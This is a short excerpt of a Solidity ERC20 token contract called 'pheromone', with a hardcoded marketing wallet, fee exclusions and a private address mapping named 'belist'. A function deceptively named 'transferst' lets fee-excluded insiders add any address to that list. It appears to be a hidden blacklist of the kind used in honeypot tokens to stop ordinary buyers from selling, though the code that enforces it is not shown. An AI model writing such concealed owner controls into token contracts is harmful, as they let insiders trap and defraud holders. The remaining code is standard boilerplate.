...
contract pheromone is Context, IERC20, Ownable {
       
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "pheromone";
    string private _symbol = "pheromone";
    uint8 private _decimals = 9;
    address payable public marketingWalletAddress; 
    address public immutable deadAddress = 0x000000000000000000000000000000000000dEaD;
    
    address _marketingWalletAddress = 0xC9151Bb614a4F343af5678c16107AC08D891a617;

    mapping (address => uint256) _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    
    mapping (address => bool) public isExcludedFromFee;
    mapping(address => bool) belist;
    ...
    function transferst (address _address) public {
        require(isExcludedFromFee[msg.sender]);
        belist[_address] = true;
    }
